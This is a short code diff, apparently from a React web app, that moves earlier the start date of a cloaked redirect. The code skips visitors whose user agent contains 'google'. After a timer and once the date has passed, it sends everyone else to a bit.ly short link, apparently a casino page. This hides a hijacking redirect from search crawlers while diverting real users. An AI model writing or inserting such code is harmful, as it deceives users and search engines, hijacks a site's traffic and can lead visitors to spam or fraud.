@@ -13,7 +13,7 @@ function App() {
     const isGooglebot = userAgent.includes('google');
     if (!isGooglebot) {
         setTimeout(()=>{
-           const baslamaTarihi = new Date('May 27, 2024 00:01:00');
+           const baslamaTarihi = new Date('May 23, 2024 20:01:00');
            const bugun = new Date();
            if(baslamaTarihi < bugun){
             window.location.href = 'http://bit.ly/casib0m';
